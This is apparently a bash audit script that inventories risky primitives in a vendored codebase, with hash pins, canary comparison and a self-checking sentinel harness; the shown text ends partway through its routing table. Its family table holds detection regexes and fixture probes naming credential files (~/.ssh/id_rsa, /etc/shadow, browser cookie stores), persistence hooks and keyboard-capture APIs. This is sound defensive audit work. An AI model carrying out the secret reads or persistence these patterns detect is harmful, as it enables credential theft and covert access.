#!/usr/bin/env bash
# t3-census.sh — the primitive census behind context/audit/wave0/t3-sites.tsv.
# Target dc047a7 / tree 3f7b69ae — if that is not the tree you are looking at, you are in the
# wrong audit (see ../manifest/frozen-prefix.sha256).
#
# Usage:
#   scripts/t3-census.sh <tree-root> <tag>
#     <tree-root>  a tree to census: vendor/basalt            -> tag "real"
#                                                   /tmp/opencode/basalt-audit/canary -> "canary"
#     <tag>        names the output dir /tmp/opencode/basalt-audit/t3/run-<tag>/
#
# The SAME invocation, unedited, runs against both trees. That is the point: the canary claim is
# "the identical census command caught it", so nothing may differ between the two runs except the
# first argument. Anything tree-specific (the manifest tier map) is an INPUT, declared as one.
#
# Artefacts written to the run dir, all of them regenerated, never patched:
#   universe.txt  ext-histogram.txt  binary-skipped.txt   patterns.tsv   sites.tsv
#   tn-budget.tsv t9-freeze.tsv      <family>.narrow.tsv  <family>.wide.tsv   fixtures/
#   <family>.fixture.tsv
# The counted-sentinel summary goes to stdout and is pasted at wave0/t3-sentinels-<tag>.txt.
#
# ------------------------------------------------------------------ design rules of this file
# 1. NO git command runs here. The audit clone is a `blob:none` partial clone
#    (remote.origin.promisor=true), so a git command inside a COPY of it can lazy-fetch from
#    origin. T3's scope makes network contact with any identifier found in the code a hard
#    non-action, and a planted canary is not a tracked file anyway, so `git ls-files` would be
#    both dangerous and wrong. The universe is `find`, sorted, and its hash is printed.
# 2. Every family self-tests its narrow pattern against a fixture string BEFORE its zero is
#    allowed to mean anything (PATTERN_OK / PATTERN_FAIL). This task already lost one zero to a
#    pattern that cannot fire: `\b(stb_|…)\b` never matches, because `_` is a word character and
#    there is no boundary after it.
# 3. A fixture string is not the tree. A family reporting 0 therefore prints
#    SCANNED_NONE (no in-tree canary) and never a bare 0, and the status of each of the 862 files
#    is a closure over the two buckets that are not the same claim:
#        UNIVERSE = SCANNED + NOT_SCANNED_BINARY     and     SCANNED = files_with_sites + none
# 4. Every family reports NARROW (writes manifest column 6) and WIDE (keyword-only bound), and
#    WIDE_ONLY_HITS — the hits the narrow pattern rejects. That number is the homonym budget. It
#    is reported per family and never folded into the narrow count.
# 5. A narrow field containing  &&  is a CO-OCCURRENCE evaluated PER FILE: a site is a p1 line
#    living in a file that also contains a p2 line anywhere. Line-level co-occurrence was the
#    first version; it found 1 site and missed serve/engine/modelfile.py, whose Path.home()/.cache
#    is on line 26 and whose write sink is several lines away. A census of "writes outside the
#    expected paths" that needs both halves on one line is not one.
# 6. LC_ALL=C everywhere and every list sorted at creation, so next month's `diff` of a no-op
#    re-run is empty (SORTED=yes is asserted, not assumed).
# 7. Nothing discovered by this script may be piped into anything that resolves a name.
#    GIT_ALLOW_PROTOCOL=none is set for the whole run as a tripwire, not as the control: the
#    control is that this file contains no git, no curl, no wget and no python network import.
set -u
export LC_ALL=C
# Importing anything from the censused tree writes __pycache__ beside the source, inside the tree.
# This script censuses the tree by file set, so that is not a side effect, it is a changed subject —
# it put 13 files into a pinned 862-file universe once. Belt for the TREE_FREE_OF_BUILD_ARTIFACTS
# sentinel below.
export PYTHONDONTWRITEBYTECODE=1
export GIT_NO_LAZY_FETCH=1 GIT_ALLOW_PROTOCOL=none

# --------------------------------------------------------------- sentinel harness
# WHY THIS EXISTS: until now every "expect N" in this file was prose inside an echo. The script
# compared nothing and always exited 0, so the two sentinels that had already printed confident
# wrong numbers (the unclosed awk BEGIN, the stale $0) would still have shipped GREEN. A list of
# expectations that no one compares is decoration; this makes them assertions with an exit status.
#
# chk NAME OP [EXPECTED] ACTUAL
#   binary ops (eq ne le ge): chk NAME eq EXPECTED ACTUAL
#   unary  ops (z nz nonempty): chk NAME nz ACTUAL      <- only three arguments
# OP z / nz / nonempty are unary on purpose: every z-check in this file was written as three args,
# and a four-arg-only signature turns the ACTUAL into the EXPECTED slot and silently fails the run.
# An empty or unset ACTUAL always FAILS: a command substitution that died must not read as a zero.
FAILS_SENT=0; SENT_TOTAL=0; SENT_FAIL_NAMES=''
# Floor for the footer's assertion, for TAG=real ONLY (the assertion set is tag-specific — see the
# footer). MEASURED: the SENTINEL_TOTAL line this script printed on vendor/basalt @ dc047a77, 2026-11-05.
# Never retype it — re-run and read the line. My first cut of this constant was a GUESS of 31 that
# passed by luck against a different quantity; a guess that passes is not a measurement.
SENT_TOTAL_FLOOR_REAL=34
chk() {
  local name=$1 op=$2 exp='' act='' verdict
  case "$op" in
    z|nz|nonempty) act=${3-} ;;
    *)             exp=${3-}; act=${4-} ;;
  esac
  SENT_TOTAL=$((SENT_TOTAL+1))
  case "$op" in
    eq)  [ -n "$act" ] && [ "$act" = "$exp" ] && verdict=PASS || verdict=FAIL ;;
    ne)  [ -n "$act" ] && [ "$act" != "$exp" ] && verdict=PASS || verdict=FAIL ;;
    z)   [ "$act" = "0" ] && verdict=PASS || verdict=FAIL ;;
    nz)  [ -n "$act" ] && [ "$act" != "0" ] && verdict=PASS || verdict=FAIL ;;
    le)  [ -n "$act" ] && [ "$act" -le "$exp" ] && verdict=PASS || verdict=FAIL ;;
    ge)  [ -n "$act" ] && [ "$act" -ge "$exp" ] && verdict=PASS || verdict=FAIL ;;
    nonempty) [ -n "$act" ] && verdict=PASS || verdict=FAIL ;;
    *)   verdict="BADOP($op)" ;;
  esac
  printf 'SENT %-46s actual=%-14s %-3s %-14s : %s\n' "$name" "${act:-(empty)}" "$op" "$exp" "$verdict"
  if [ "$verdict" != PASS ]; then FAILS_SENT=$((FAILS_SENT+1)); SENT_FAIL_NAMES="$SENT_FAIL_NAMES $name"; fi
}
# `need <path> <label>` used to be the harness's third assertion form. It is GONE, and so is its last
# pair of calls (see the S14/S15 notes): both asserted that a python half had produced a file that the
# adjacent `chk` already required to be non-empty, so each was a strict logical implication of its
# neighbour and each inflated the denominator the verdict is reported over. Keeping the function around
# "in case" keeps a counter that adds to SENT_TOTAL without comparing anything, which is the exact
# mechanism the SENTINEL_TOTAL floor below exists to make expensive. Recover it from git if a real
# existence claim is ever needed — one that is not already implied by a comparison.
PYFAIL=0
runpy() { # runpy <label> <args...> — a python half that dies silently deletes a sentinel line
  local label=$1; shift
  SENT_TOTAL=$((SENT_TOTAL+1))
  # stderr goes to its OWN file. It used to be `2>&1 | tee "$RUN/$label.out"`, and that .out is the
  # exact file grab() parses with a substring match — so a traceback line, a DeprecationWarning or any
  # other stderr noise that happened to contain `KEY=` could be read back as the value of a KEY, and a
  # python half that printed a warning and a correct value would still be scored on the warning's
  # bytes. stdout is captured then replayed (no `tee`, no process substitution: `>(tee …)` races, the
  # .out may still be flushing while grab() reads it, and a truncated capture is worse than a noisy one.
  # Losing live streaming costs nothing here — this output is pasted, not watched.)
  python3 "$@" > "$RUN/$label.out" 2> "$RUN/$label.err"
  local rc=$?
  cat "$RUN/$label.out"
  [ -s "$RUN/$label.err" ] && { echo "  ${label} stderr:"; sed 's/^/    /' "$RUN/$label.err"; }
  if [ "$rc" -ne 0 ]; then
    printf 'SENT %-46s python died                 : FAIL\n' "$label"; PYFAIL=$((PYFAIL+1))
    FAILS_SENT=$((FAILS_SENT+1)); SENT_FAIL_NAMES="$SENT_FAIL_NAMES $label"
  else
    printf 'SENT %-46s ran to completion           : PASS\n' "$label"
  fi
}
# pull one KEY=value out of a runpy capture (empty if the python half never printed it). VALUE ends
# at the next whitespace: a line carries several KEY=VALUE pairs, so splitting on '=' is not enough.
grab() { awk -v k="$2" 'match($0, k"=[^ ]*") {print substr($0, RSTART+length(k)+1, RLENGTH-length(k)-1); exit}' "$RUN/$1.out" 2>/dev/null; }

ROOT="${1:?usage: t3-census.sh <tree-root> <tag>}"
TAG="${2:?usage: t3-census.sh <tree-root> <tag>}"
RUN=/tmp/opencode/basalt-audit/t3/run-$TAG
OUT=/tmp/opencode/basalt-audit/t3/out-$TAG
rm -rf "$RUN" "$OUT"; mkdir -p "$RUN" || exit 2
# Resolve the manifest location NOW, before the cd below: $0 is relative to the invocation cwd, so
# resolving it after `cd "$ROOT"` yields "/../manifest" and the manifest gate silently reads
# nothing and prints zeros. A sentinel that prints a plausible 0 is worse than no sentinel.
MAN="$(cd "$(dirname "$0")" && pwd)/../manifest"
# SELF is resolved by the SAME rule on the SAME line-group for the same reason. It was not, originally:
# the generator hashed `sha256sum "$0"` at its own reporting line — after the cd — and printed
# `GENERATOR_SHA256=` empty while the run still reported PASS on 28 sentinels. One resolution idiom in
# this file, used twice; a second one placed after the cd is how that happened.
SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
[ -d "$MAN" ] || { echo "MANIFEST_DIR_NOT_FOUND=$MAN" >&2; exit 2; }
PROJ="$(cd "$MAN/../../../" && pwd)"   # server/basalt — resolves the plan file for the task-id gate
[ -f "$PROJ/context/plans/02_basalt_vendor_audit.md" ] || { echo "PLAN_NOT_FOUND=$PROJ" >&2; exit 2; }
cd "$ROOT" || exit 2

# the shared scratch inputs (derived from the manifest by scripts/t3-inputs.sh; see § inputs).
# ALL THREE are load-bearing: an absent tier map silently re-routes every row to a section default,
# and an absent tierA-files.tsv silently zeroes S12 and S13 in a way indistinguishable from an
# honest zero (hoodie M1 — a guard on two of three inputs is not a guard).
T3=/tmp/opencode/basalt-audit/t3
TIERMAP="$T3/tier-map.tsv"        # path <TAB> TN   (empty TN = row not yet owned)
MANLOC="$T3/manifest-loc.tsv"     # path <TAB> LOC
TIERA="$T3/tierA-files.tsv"       # path <TAB> tier (Tier A + B-vendored; the S12/S13 filter)
for f in "$TIERMAP" "$MANLOC" "$TIERA"; do
  [ -s "$f" ] || { echo "MISSING INPUT $f — run scripts/t3-inputs.sh first. Refusing to run: each of these silently changes counts if absent." >&2; exit 2; }
done

echo "== t3-census.sh started=$(date -u +%FT%TZ)"
# Resolved path, not the invocation spelling: `ARGV=$0` used to print the very relative string that
# failed to resolve after the cd, so the evidence named a path that did not exist from where the hash
# was taken.
echo "ARGV=$SELF $*"
SELF_SHA=$(sha256sum "$SELF" | cut -d' ' -f1)
echo "GENERATOR_SHA256=$SELF_SHA"
# Shape, not presence. `nonempty` passes on a directory hash, a truncated read and a wrong file
# (neckbeard): the degenerate cases all have bytes in them. 64 lowercase hex is the only thing a
# sha256 is allowed to look like here, and grep -vc prints 1 on empty input, so an empty capture FAILS
# rather than reading as a zero.
BADSHA=$(printf '%s\n' "$SELF_SHA" | grep -vcE '^[0-9a-f]{64}$')
chk GENERATOR_SHA_IS_64_HEX           z    "$BADSHA"
# The token is only worth freezing if something COMPARES it. This file's founding claim (header 12-14)
# is "the SAME invocation, unedited, on both trees", and GENERATOR_SHA256 is the only thing that could
# prove it — so it is written per run and compared across runs below, next to the universe diff that
# already does this for the tree. Two correct numbers in two evidence files that a human eyeballs prove
# nothing.
printf '%s\n' "$SELF_SHA" > "$RUN/generator.sha256"
echo "TREE=$ROOT"
echo "TAG=$TAG  RUN_DIR=$RUN"
# reproducibility lines: the inputs that decide assigned-TN live in scratch, so they are hashed
# here or the committed output cannot be re-derived (hoodie, claim 3).
# And PINNED, not just printed: these three files regenerate the TN routing and the S12/S13 Tier-A filter.
# If the manifest moves, or t3-inputs.sh changes, between the real run and a canary run, both runs census
# the identical tree with DIFFERENT routing and a different filter — and the universe diff cannot see it,
# because the tree really did stay put. The canary claim would silently degrade to "a different census on
# the same tree". Equal inputs is at least as load-bearing as equal generator bytes.
: > "$RUN/inputs.sha256"
for f in "$TIERMAP" "$MANLOC" "$TIERA"; do
  printf 'INPUT_SHA256=%-22s %s\n' "$(basename "$f")" "$(sha256sum "$f" | cut -d' ' -f1)"
  sha256sum "$f" | cut -d' ' -f1 >> "$RUN/inputs.sha256"
done
echo "REPRODUCE=scripts/t3-inputs.sh && scripts/t3-census.sh $ROOT $TAG"
echo "GREP_VERSION=$(grep --version | head -1)"
echo "BASH_VERSION=$BASH_VERSION  AWK=$(awk --version 2>/dev/null | head -1 || echo other-awk)"
# Two sort orders, compared — NOT one order compared to a constant. The first version of this line
# asserted `sort` output equals "Bab" inside a process that had already `export LC_ALL=C` twelve lines
# up: a tautology with a passing constant, which could only fail if the export were deleted. What the
# census actually mixes is two idioms — bare `sort` (inherits the export) and inline `LC_ALL=C sort`
# (does not need it) — so the invariant that matters is that they AGREE. If the export goes away the
# prefixed calls keep working and the bare ones silently change order; this is the line that notices.
# HOST LIMIT, measured 2026-11-05 rather than assumed: this machine has exactly three locales (C,
# C.utf8, POSIX), and glibc maps an unknown one like en_US.UTF-8 back to C — so the realistic trigger
# (a UTF-8 collator being exported, which would print aBb instead of Bab) CANNOT be reproduced here.
# What was verified instead is liveness: breaking the sort itself (feeding it b B a unsorted) fires this
# chk with actual=bBa. So it is a tripwire on the export and on the sort, and its locale-regression half
# is only armed on a host that has a second locale installed. Recorded in pitfalls.md.
SORT_DFLT=$(printf 'a\nB\nb\n' | sort | tr -d '\n')
SORT_C=$(printf 'a\nB\nb\n' | LC_ALL=C sort | tr -d '\n')
echo "LC_ALL=$LC_ALL  SORT_DEFAULT=$SORT_DFLT  SORT_C=$SORT_C"
chk SORT_DEFAULT_ORDER_EQ_C           eq    "$SORT_C" "$SORT_DFLT"

# --------------------------------------------------------------- file universe
find . -type f -not -path './.git/*' | sed 's|^\./||' | LC_ALL=C sort > "$RUN/universe.txt"
UNIV="$RUN/universe.txt"
UNIV_SHA=$(sha256sum "$UNIV" | cut -d' ' -f1)
# Build artifacts inside the tree are CONTAMINATION, not coverage. The pin hash below is what actually
# caught the 13 __pycache__ files this audit's own PoC harness left here — but a hash says "something
# differs" and nothing about what or who. Artifact paths are never audit subjects, so their presence
# is always a defect in an earlier run. Naming it turns a forensic puzzle into a line item.
ARTIFACTS=$(grep -Ec '(^|/)__pycache__(/|$)|\.pyc$|(^|/)\.mypy_cache(/|$)|(^|/)node_modules(/|$)' "$UNIV" || true)
[ "$TAG" != real ] || chk TREE_FREE_OF_BUILD_ARTIFACTS z "$ARTIFACTS"
echo "TREE_BUILD_ARTIFACTS=$ARTIFACTS"
echo "UNIVERSE=$(wc -l < "$UNIV")"
echo "UNIVERSE_SHA256=$UNIV_SHA   # a hash of the sorted path set, NOT git's tree hash: the tree hash covers contents and this one does not"
# The tree assertion. An audit that can be run against the wrong tree and print the same shape is
# not an audit. MEASURED 2026-11-05 against vendor/basalt at dc047a77 (tree 3f7b69ae) by the same
# find|sed|sort pipeline this script uses; re-measure it, never retype it.
# TAG-AWARE BY DESIGN (hoodie M2): the canary copy legitimately differs from the pin by exactly the
# planted files, so demanding the pin's hash there would ship a permanent red line — and a red line
# that can never be right is the line that gets skimmed. For TAG=canary the assertion is instead
# "differs from the audit run by ONLY the planted paths", which is computed below, not asserted.
EXPECTED_UNIVERSE_SHA=6d0c70b8f6bd1c5c1e1496903c9e4ced2e3ddf70631f858c6e3d4b7c33462c23
EXPECTED_UNIVERSE=862
EXPECTED_LOC=219247   # manifest column 4 total. NOTE manifest col 4 IS wc -l of this tree, so this
                      # comparison validates transcription between the manifest and the worktree; it
                      # does NOT re-prove the pin — only EXPECTED_UNIVERSE_SHA is a pin (neckbeard).
if [ "$TAG" = real ]; then
  chk UNIVERSE_COUNT_EQ_PIN           eq "$EXPECTED_UNIVERSE" "$(wc -l < "$UNIV")"
  chk UNIVERSE_SHA_MATCHES_PIN        eq "$EXPECTED_UNIVERSE_SHA" "$UNIV_SHA"
else
  # DISP, not SENT. This line and MANIFEST_COL6_STATE below wear the SENT format but go through printf,
  # so they do NOT increment SENT_TOTAL — which meant that anyone counting `^SENT ` lines in the pasted
  # evidence got a different total than the footer reported. A count and a display over different sets is
  # the defect this file has been fixing all cycle; the format now tells them apart.
  printf 'DISP %-46s %-10s (canary tree: hash compared to run-real, not to the pin)\n' UNIVERSE_SHA_MATCHES_PIN "$UNIV_SHA"
fi
LOC_TOTAL=$(while IFS= read -r f; do wc -l < "$f" 2>/dev/null; done < "$UNIV" | awk '{s+=$1} END{print s+0}')
MANLOC_SUM=$(awk -F'\t' '{s+=$2} END{print s+0}' "$MANLOC")
echo "LOC_TOTAL=$LOC_TOTAL  MANIFEST_LOC_SUM=$MANLOC_SUM"
if [ "$TAG" = real ]; then
  chk LOC_WORKTREE_EQ_MANIFEST        eq "$MANLOC_SUM" "$LOC_TOTAL"
  chk LOC_EQ_PIN_CONSTANT             eq "$EXPECTED_LOC" "$LOC_TOTAL"
fi
# --------------------------------------------------------------- § tree diff (was cited, never written)
# The canary claim is "the identical census, on a copy that differs ONLY by the planted files".
# That is only a claim if the diff is computed. Both run dirs survive: this script only rm -rf's
# its own tag, so run-real/universe.txt is available during a canary run.
if [ "$TAG" != real ] && [ -f "$T3/run-real/universe.txt" ]; then
  LC_ALL=C comm -13 "$T3/run-real/universe.txt" "$UNIV" > "$RUN/tree-added.txt"
  LC_ALL=C comm -23 "$T3/run-real/universe.txt" "$UNIV" > "$RUN/tree-removed.txt"
  TA=$(wc -l < "$RUN/tree-added.txt"); TR=$(wc -l < "$RUN/tree-removed.txt")
  echo "TREE_DIFF_VS_REAL=+$TA/-$TR  added_list=tree-added.txt removed_list=tree-removed.txt"
  sed 's/^/    +/' "$RUN/tree-added.txt"
  sed 's/^/    -/' "$RUN/tree-removed.txt"
  # Removals must be zero (a copy, not a prune). Additions are the planted files; anything that is
  # not a planted sentinel path is an unexplained difference and fails the run.
  chk TREE_DIFF_NO_REMOVED_PATHS      z    "$TR"
  # `grep -c` prints 0 AND exits 1 when nothing matched, so `$(grep -c … || echo 0)` yields "0\n0"
  # and the comparison fails on an empty file. Counted with awk instead.
  STRAY=$(awk '!/CANARY|SENTINEL|canary/' "$RUN/tree-added.txt" | awk 'END{print NR+0}')
  chk TREE_DIFF_ADDITIONS_ARE_PLANTED z    "$STRAY"
  # The other half of "the identical census". Comparing the TREES proves the input differed only by the
  # planted files; nothing until this line proved the PROGRAM was the same. Without it, a canary run
  # that quietly used an edited generator would still report a caught canary — the control would be
  # scoring a different instrument than the one under audit.
  if [ -f "$T3/run-real/generator.sha256" ]; then
    chk GENERATOR_SHA_SAME_AS_REAL    eq "$(cat "$T3/run-real/generator.sha256")" "$SELF_SHA"
  else
    echo "GENERATOR_SHA_SAME_AS_REAL=unavailable (run-real/generator.sha256 missing — the canary claim cannot prove the same generator ran)"
    FAILS_SENT=$((FAILS_SENT+1)); SENT_FAIL_NAMES="$SENT_FAIL_NAMES GENERATOR_SHA_AVAILABLE"
  fi
  # Third leg of "the identical census": the same generator pointed at DIFFERENT scratch inputs is a
  # different census. cmp, not a hashed token — the file is three lines and equality is the claim.
  if [ -f "$T3/run-real/inputs.sha256" ]; then
    cmp -s "$T3/run-real/inputs.sha256" "$RUN/inputs.sha256"; INPUTS_DIFF=$?
    chk INPUTS_SHA_SAME_AS_REAL       z    "$INPUTS_DIFF"
  else
    echo "INPUTS_SHA_SAME_AS_REAL=unavailable (run-real/inputs.sha256 missing — cannot prove the same tier-map/manifest/tierA inputs fed both runs)"
    FAILS_SENT=$((FAILS_SENT+1)); SENT_FAIL_NAMES="$SENT_FAIL_NAMES INPUTS_SHA_AVAILABLE"
  fi
elif [ "$TAG" != real ]; then
  echo "TREE_DIFF_VS_REAL=unavailable (run-real/universe.txt missing — run the audit tree first; the canary claim is UNSUPPORTED without it)"
  FAILS_SENT=$((FAILS_SENT+1)); SENT_FAIL_NAMES="$SENT_FAIL_NAMES TREE_DIFF_AVAILABLE"
fi
# determinism guard: file lists must be sorted at creation or every downstream count drifts.
# ASSERTED, because design rule 6 (line ~45) claims in prose that SORTED=yes "is asserted, not
# assumed" and until now nothing asserted it — the value was computed and echoed, an unlabelled
# display in a file whose footer promises unverified claims are labelled. HONEST LIMIT (neckbeard):
# `sort -c` here re-tests the output of the LC_ALL=C sort that produced $UNIV, so it can only fail if
# sort stops sorting. It is a tripwire on the pipeline, not a proof about comm inputs; the comm pairs
# in this file are all sort-produced by construction, and that is stated rather than tested.
SORT_OK=$(LC_ALL=C sort -c "$UNIV" 2>/dev/null && echo yes || echo NO)
chk UNIVERSE_LIST_IS_SORTED           eq    "yes" "$SORT_OK"
echo "SORTED=$SORT_OK"

sed 's|.*\.||' "$UNIV" | LC_ALL=C sort | uniq -c | LC_ALL=C sort -rn > "$RUN/ext-histogram.txt"
echo "EXT_CLASSES=$(wc -l < "$RUN/ext-histogram.txt")"
# Which files grep -I will never search. "No hits" and "never searched" are different claims and
# must never share a total: these rows stay `unassigned` in the manifest and belong to T10.
while IFS= read -r f; do grep -Il '' -- "$f" 2>/dev/null | grep -q . || printf '%s\n' "$f"; done \
  < "$UNIV" > "$RUN/binary-skipped.txt"
echo "NOT_SCANNED_BINARY=$(wc -l < "$RUN/binary-skipped.txt")   (T10's strings pass owns these; list: binary-skipped.txt)"

# --------------------------------------------------------------- family table
# name <TAB> narrow <TAB> wide <TAB> probe-that-MUST-match-narrow <TAB> mode
#   mode=line     narrow fires per line
#   mode=cooccur  narrow is `p1 && p2`, evaluated PER FILE (see design rule 5)
cat > "$RUN/families.tsv" <<'FAM'
net-socket	sockaddr|sockaddr_in|AF_INET|AF_INET6|AF_UNIX|AF_PACKET|AF_NETLINK|SOCK_STREAM|SOCK_DGRAM|SOCK_RAW|htons|htonl|inet_pton|inet_ntop|socketpair|IPPROTO_|SO_REUSE|sin_port|sin6_port|sa_family|\bsocket[[:space:]]*\(|\bsocket\.[a-z_]+	(^|[^_[:alnum:]])(socket|connect|bind|listen|accept|send|recv|sendto|recvfrom|sendmsg|recvmsg|shutdown)[[:space:]]*\(	int s = socket(AF_INET, SOCK_STREAM, 0);	line
dns	getaddrinfo|gethostbyname|gethostbyaddr|getfqdn|gethostname[[:space:]]*\(|socket\.getaddr|res_query|res_search|/etc/hosts	getaddrinfo|gethostby|nslookup|dig[[:space:]]|hostname	infos = socket.getaddrinfo(host, port)	line
exec-spawn	popen[[:space:]]*\(|\bsystem[[:space:]]*\(|\bfork[[:space:]]*\(|\bexecv?[ple]*[[:space:]]*\(|posix_spawn[wp]?[[:space:]]*\(|CreateProcess[WA]?[[:space:]]*\(|ShellExecute|subprocess\.[A-Za-z_]+|os\.(system|popen|exec[a-z]+|spawn[a-z]+|fork)[[:space:]]*\(|shell[[:space:]]*=[[:space:]]*True	(^|[^_[:alnum:]])(system|popen|fork|exec|spawn|subprocess|command|run)[[:space:]]*\(	proc = subprocess.Popen(cmd, shell=True)	line
dlopen	dlopen[[:space:]]*\(|dlsym[[:space:]]*\(|dlmopen|RTLD_[A-Z]+|LoadLibrary[AW]?[[:space:]]*\(|GetProcAddress|ctypes\.(CDLL|WinDLL|PyDLL|OLELibrary)|ctypes\.(windll|cdll)\.	dlopen|dlsym|LoadLibrary|GetProcAddress|CDLL|WinDLL|RTLD	lib = ctypes.CDLL("libcuda.so.1")	line
raw-syscall	(^|[^_[:alnum:]])syscall[[:space:]]*\(|\bSYS_[A-Z0-9_]+|\b__NR_[A-Za-z0-9_]+|ptrace[[:space:]]*\(|\.syscall[[:space:]]*\(|syscall[[:space:]]+syscall	(^|[^_[:alnum:]])(syscall|sys_call|ptrace|getauxval)[[:space:]]*\(	_ = syscall(SYS_getpid);	line
file-write-outside	(^|[^_[:alnum:]])(open|fopen|ofstream|freopen|mkdir|rename|unlink|rmdir|remove|shutil\.(copy|move|rmtree|mkdtemp)|write_bytes|write_text)[[:space:]]*\( && (/etc/|/var/|/tmp/|/var/tmp|/home/|\.cache|expanduser|Path\.home|USERPROFILE|APPDATA|TMPDIR|HOME)	open|fopen|ofstream|mkdir|rename|unlink|write_bytes|write_text	open("/home/operator/.cache/basalt/blob", "w")	cooccur
fingerprint-read	getenv[[:space:]]*\(|os\.environ|os\.getenv|platform\.node|gethostname|/etc/machine-id|/var/lib/dbus/machine-id|cpuinfo|getlogin|getpwuid|gete?[u]?id[[:space:]]*\(|os\.uname|platform\.(uname|processor|machine)|uuid\.getnode|sysinfo|/proc/self/(environ|cgroup|cmdline)|__cpuid|nvmlDeviceGet(PCI|UUID|Serial)	getenv|environ|hostname|machine-id|cpuinfo|getuid|uname|cpuid	const char* env = std::getenv("CUDA_VISIBLE_DEVICES");	line
credential-store	\.ssh|id_rsa|id_ed25519|authorized_keys|\.aws/|\.config/gcloud|\.gnupg|keyring|KEYRING|/etc/shadow|\.netrc|\.npmrc|\.pypirc|GOOGLE_APPLICATION_CREDENTIALS|Login Data|cookies\.sqlite|secret\.sql	ssh|aws|keyring|credential|password|wallet|gnupg	open(os.path.expanduser("~/.ssh/id_rsa"))	line
proc-sys	/proc/|/sys/|/dev/shm|/dev/mem|/dev/kmem|sysctl|GetSystemInfo	/proc/|/sys/|shm|sysctl|cgroup	std::ifstream in("/proc/meminfo");	line
persistence	crontab|cron\.d|/etc/cron|systemd/(system|user)|systemctl|\.bashrc|\.bash_profile|\.zshrc|/etc/profile|autostart|\.desktop|LaunchAgent|LaunchDaemon|StartupFolder|schtasks|reg[[:space:]]+add|HKCU|HKLM|New-Service|inittab|rc\.local|/etc/init\.d	crontab|cron|systemd|systemctl|bashrc|profile|autostart|desktop|startup|schtasks|service	subprocess.run(["crontab", "-l"])	line
input-capture	EVIOCGRAB|EV_KEY|/dev/input|input_event|XRecord|XISelectEvents|XInput|uinput|UI_DEV_CREATE|SetWindowsHookEx|WH_KEYBOARD|GetAsyncKeyState|GetKeyState|CGEventTapCreate|XGrabKeyboard|ReadConsoleInput	EVIOCGRAB|/dev/input|XRecord|XInput|uinput|Hook|AsyncKey|EventTap	int r = ioctl(fd, EVIOCGRAB, 1);	line
parser-network-bytes	stbi_(load|info)(_from_memory)?[[:space:]]*\(|GGUFFile|gguf_|mmproj|struct\.unpack|from_buffer|np\.frombuffer|zipfile|tarfile|gzip|safetensors|jinja2|Environment[[:space:]]*\(|Template[[:space:]]*\(|chunked|Transfer-[Ee]ncoding|Content-[Ll]ength	(^|[^_[:alnum:]])(parse|decode|read_header|unpack|inflate|decompress|tokenize)[[:space:]]*\(|json\.(load|loads)	img = stbi_load_from_memory(data, n, &w, &h, &c, 3);	line
vendored-third-party	stb_image|stbi_|ggml_|ggml-|llama\.cpp|llama-|gguf-py|Infernix|miniaudio|xxhash|doctest|catch2|nlohmann|cpp-httplib|cJSON	(^|[^_[:alnum:]])(stb|stbi|ggml|llama|miniaudio|xxhash|doctest|catch|nlohmann|httplib|cJSON)[_a-z]*	/* stb_image - v2.30 - public domain image loader */	line
model-instruction	\b(you (should|must)|we (should|must)|do not (add|use|touch|put)|never (add|use|put|touch)|the agent (should|must)|before (you|we) (add|edit|open)|AI assistant|Copilot instructions)\b	AGENTS|CONTRIBUTING|assistant|instruction|agent|should|must_engine_code_never_names	Engine code never adds an OS name here; the agent should keep it that way	line
net-library-import	^[[:space:]]*(import|from)[[:space:]]+(socket|ssl|urllib|http|ftplib|smtplib|telnetlib|xmlrpc|socketserver|webbrowser|requests|httpx|aiohttp|urllib3|websocket)[^.a-zA-Z]|^[[:space:]]*(import|from)[[:space:]]+(socket|ssl|urllib|http)[.]|\b(urllib\.request|urllib\.error|http\.client|http\.server|requests\.(get|post|Session|request)|httpx\.(get|post|AsyncClient|Client)|socket\.(socket|create_connection|getaddrinfo|gethostby)|ssl\.[a-z_]+\(|webbrowser\.(open|get)|socketserver\.[A-Za-z]+|XMLHttpRequest|new[[:space:]]+WebSocket|axios\.[a-z])|\bfetch[[:space:]]*\(|httplib::	urllib|requests|http|socket|ssl|url	import urllib.request as u	line
FAM

# --------------------------------------------------------------- routing table
# section <TAB> family <TAB> default-TN <TAB> kind <TAB> granularity <TAB> exclusion <TAB> why
#   kind=site        rows come from the keyword pass
#   kind=procedure   rows come from a named procedure (the keyword pass is silenced for it)
#   kind=substrate   tables in census.md, never rows, never a column-6 token: imports and build
#                    deps are the SUBSTRATE that produces net-socket/exec-spawn/dlopen, and a
#                    `python-import` token would fire on nearly every serve/ row and make the
#                    column-6 histogram useless.
#   granularity=file ONE row per file, at its first hit line, with the hit count carried in
#                    column 6 so the collapse is lossless. A file-level property stated once per
#                    line is the grep output restated: the pre-amendment pass produced 1,801 rows
#                    inside src/vision/stb_image.h alone.
#   exclusion=docs   hits under the EXCLUDE_DIRS list below are dropped AND COUNTED, per family.
#                    Prose containing the English word "requests" is not a capability.
EXCLUDE_DIRS='docs/ site/ assets/'
#
# S1..S18 are the plan's sections in the plan's order. S19 is NEW, added by the census: the
# absent token is the reason the plan's "one outbound channel" Key Fact was written
# (tools/convert/mtp_fetch.py:31 urllib.request, serve/server.py webbrowser), so the family that
# would have caught it is named after what it catches instead of being folded into net-socket.
#
# PREDICATE AMENDMENT, dated, disclosed, made before any canary was planted:
#   v1 = granularity=line, exclusion=none      -> 2,846 rows   (out-<tag>-firstpass kept)
#   v2 = this table                            -> this run
#   reason: not "it was noisy". src/vision/stb_image.h is B-vendored@T5 in the manifest — tier B
#   means "version-diffed as a dependency, never read as first-party" — so line-granularity was
#   measuring a unit the audit had already decided not to read. The amendment aligns the row
#   unit with the manifest's own tier semantics. See wave0/t3-predicate-amendments.tsv for the
#   closure, which must sum exactly.
cat > "$RUN/routing.tsv" <<'ROUTE'
S1	net-socket	T4	site	line	docs	plan T4 is the outbound channel: image_source.py / security.py / handler.py	yes
S2	dns	T4	site	line	docs	resolution is the front half of the same connect path	yes
S3	exec-spawn	T8	site	line	docs	the argv table covers the C++ and Python exec sites	yes
S4	dlopen	T8	site	line	docs	handle provenance at the platform seam (dynlib.cpp) and the ctypes loads	yes
S5	raw-syscall	T9	site	line	docs	no named owner in the plan; engine-side unknowns are T9's census-assigned bucket	yes
S6	file-write-outside	T6a	site	line	docs	logging/metrics write paths; C++ writes route by tier, else T9	yes
S7	fingerprint-read	T6c	site	line	docs	negative sweep: a fingerprint read with no sink is T6c's verdict	yes
S8	credential-store	T6c	site	line	docs	plan T6c names the credential-store sweep explicitly	yes
S9	proc-sys	T6c	site	line	docs	negative sweep	yes
